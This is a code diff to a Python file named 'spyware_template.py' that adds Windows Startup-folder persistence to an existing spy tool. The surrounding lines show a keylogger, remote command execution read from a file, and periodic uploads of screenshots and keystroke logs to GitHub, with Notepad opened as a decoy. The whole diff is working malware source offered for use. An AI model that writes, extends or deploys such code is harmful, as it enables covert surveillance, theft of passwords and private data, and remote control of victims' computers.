@@ -1,15 +1,17 @@
 # Template: spyware_template.py
-
 import time
 import requests
 from base64 import b64encode, b64decode
 import os
 from datetime import datetime
 from PIL import ImageGrab
+import time
 import subprocess
 from pynput import keyboard, mouse
 from pynput.keyboard import Key
 import threading
+import shutil
+import sys
 
 # Open Notepad
 subprocess.Popen(['notepad.exe'])
@@ -308,8 +310,29 @@ def execute_commands():
         # After executing commands, delete commands.txt
         if os.path.exists(command_file_path):
             os.remove(command_file_path)
+def add_to_startup():
+    # Get the path to the startup folder
+    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+    
+    # Get the path of the current script
+    current_script = sys.argv[0]
+    
+    # Define the destination path in the startup folder
+    destination = os.path.join(startup_folder, os.path.basename(current_script))
+    
+    # Copy the script to the startup folder if it doesn't already exist there
+    if not os.path.exists(destination):
+        shutil.copy(current_script, destination)
+        pass
+    else:
+        pass
+
+
 # ----------------------------------------- Main function to automate everything
 def main():
+
+    add_to_startup()
+
     try:
         # Start the keylogger and command execution in separate threads
         keylogger_thread = threading.Thread(target=log_keys)
@@ -329,6 +352,8 @@ def main():
 
             # Upload screenshot to GitHub
             upload_to_github(screenshot_path, screenshot_name, screenshot_folder_url)
+            # Wait for 60 seconds before taking the next screenshot
+            time.sleep(60)
 
             # Upload keylog to GitHub
             keylog_path = os.path.join(os.getenv('TEMP'), "keylog.txt")
@@ -343,8 +368,6 @@ def main():
             cleanup_old_files(screenshot_folder_url, ignore_file='placeholder.txt')
             cleanup_old_files(log_folder_url, ignore_file='placeholder.txt')
 
-            # Wait for 60 seconds before taking the next screenshot
-            time.sleep(60)
 
     except Exception as e:
         pass
